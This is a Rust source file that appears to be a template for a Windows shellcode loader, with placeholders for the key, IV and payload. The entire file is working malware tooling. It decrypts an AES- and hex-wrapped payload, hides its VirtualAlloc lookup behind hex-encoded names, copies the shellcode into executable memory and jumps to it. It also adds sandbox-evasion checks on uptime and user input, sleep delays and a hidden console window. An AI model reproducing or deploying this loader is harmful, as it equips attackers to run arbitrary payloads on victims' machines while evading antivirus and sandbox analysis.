#![windows_subsystem = "windows"]
extern crate alloc;

use alloc::ffi::CString;
use std::{mem, thread};
use std::arch::asm;
use std::mem::transmute;
use std::ptr::{null, null_mut};
use std::time::Duration;
use obfstr::obfstr as s;
use hex;
use libaes::Cipher;
use rand::Rng;
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::sysinfoapi::GetTickCount;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use winapi::um::winuser::{GetCursorPos, GetLastInputInfo, LASTINPUTINFO, MOUSEMOVEPOINT};

type CustomVirtualAlloc = unsafe extern "system" fn(
    lpAddress: *mut winapi::ctypes::c_void,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> *mut winapi::ctypes::c_void;



fn main() {
    unsafe {
        if !analy_environment() {
            thread::sleep(Duration::from_secs(10));
            return;
        }
    }
    thread::sleep(Duration::from_secs(2));
    // 还原
    let key = String::from("${key}");
    let iv = String::from("${iv}");
    //编译混淆
    let hexDecode = hex::decode(s!("${hexCode}")).expect("hex decode err");
    let aesShellCode = base64::decode(hexDecode).unwrap();
    thread::sleep(Duration::from_secs(1));
    let shellCode = aesDecrypt(key, iv, aesShellCode);

    let flen = shellCode.len();
    thread::sleep(Duration::from_secs(2));


    let Kname = hex::decode("6b65726e656c33322e646c6c").expect("hex decode err");
    let Vname = hex::decode("5669727475616c416c6c6f63").expect("hex decode err");
    let kernel32 = CString::new(Kname).expect("CString::new failed");
    let virtual_alloc = CString::new(Vname).expect("CString::new failed");


    let h_module = unsafe { GetModuleHandleA(kernel32.as_ptr()) };

    // 隐藏 VirtualAlloc
    let fn_virtual_alloc = unsafe {
        mem::transmute::<*const (), CustomVirtualAlloc>(
            GetProcAddress(
                h_module,
                virtual_alloc.as_ptr(),
            ) as *const ())
    };

    let new_buf = unsafe { fn_virtual_alloc(0 as _, flen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };

    let new_buf_ptr_1: *mut u8 = new_buf as *mut u8 as _;
    unsafe { std::ptr::copy_nonoverlapping(shellCode.as_ptr(), new_buf_ptr_1, flen) };

    thread::sleep(Duration::from_secs(2));
    unsafe {
        let jmp_target = new_buf.offset(0 as isize);
        asm!("jmp {}", in(reg) jmp_target)
    };
}

pub fn aesDecrypt(key: String, iv: String, ciphertext: Vec<u8>) -> Vec<u8> {
    let cipher = Cipher::new_128(&key.as_bytes()[0..16].try_into().unwrap());
    cipher.cbc_decrypt(iv.as_bytes(), &ciphertext)
}

pub unsafe fn analy_environment() -> bool {
    let tick_count = GetTickCount();
    if tick_count <= 3600000 {
        return false;
    }
    println!("系统启动以来的毫秒数: {}", tick_count);
    let mut last_input_info: LASTINPUTINFO = LASTINPUTINFO {
        cbSize: mem::size_of::<LASTINPUTINFO>() as u32,
        dwTime: 0,
    };
    last_input_info.cbSize = mem::size_of::<LASTINPUTINFO>() as u32;


    if GetLastInputInfo(&mut last_input_info as *mut LASTINPUTINFO) != 0 {
        let last_input_time = last_input_info.dwTime;
        let system_uptime = GetTickCount();
        if system_uptime - last_input_time > 0 {
            println!("鼠标从开机后移动过");
            return true;
        } else {
            println!("鼠标从开机后未移动过");
            return false;
        }
    }


    return false;
}

